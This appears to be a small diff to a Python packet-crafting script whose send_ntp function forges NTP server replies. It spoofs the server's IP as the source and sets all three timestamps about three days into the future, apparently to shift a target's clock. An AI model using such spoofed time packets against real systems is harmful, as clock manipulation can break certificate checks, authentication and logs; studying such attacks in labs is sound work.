@@ -18,6 +18,9 @@ def send_ntp(server_ip, src_ip, ref_timestamp):
     ntp_packet.poll = 4
     ntp_packet.mode = 4
     ntp_packet.id = server_ip
+    ntp_packet.orig = time.time() + 259201
+    ntp_packet.recv = time.time() + 259201
+    ntp_packet.sent =time.time() + 259201
 
     ip_packet = IP(src=server_ip, dst=src_ip)
 
